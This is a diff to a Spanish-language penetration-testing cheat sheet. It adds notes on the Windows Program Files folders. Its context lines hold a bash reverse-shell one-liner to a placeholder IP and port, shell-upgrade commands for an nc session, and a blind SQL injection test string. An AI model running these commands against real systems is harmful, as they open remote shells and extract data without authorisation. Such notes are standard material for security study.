@@ -212,6 +212,7 @@ bash -c "bash -i >& /dev/tcp/IP/port 0>&1"
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 (inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+
 ````
 
 Con nc si es que existe en la maquina enviate una reverseshell
@@ -1585,6 +1586,12 @@ admin' and substring(username,2,1)='d'-- # va a dar true o el mensaje
 
 
 # Windows
+
+## Program files
+
+Program Files: Esta carpeta está destinada para los programas de 64 bits. Cuando instalas una aplicación de 64 bits en un sistema de 64 bits, por defecto se ubicará en esta carpeta.
+
+Program Files (x86): Esta carpeta es para los programas de 32 bits. En un sistema operativo de 64 bits, las aplicaciones de 32 bits se instalan en esta carpeta para mantenerlas separadas de las aplicaciones de 64 bits.
 
 ## Arquitecura x86 o x64
 
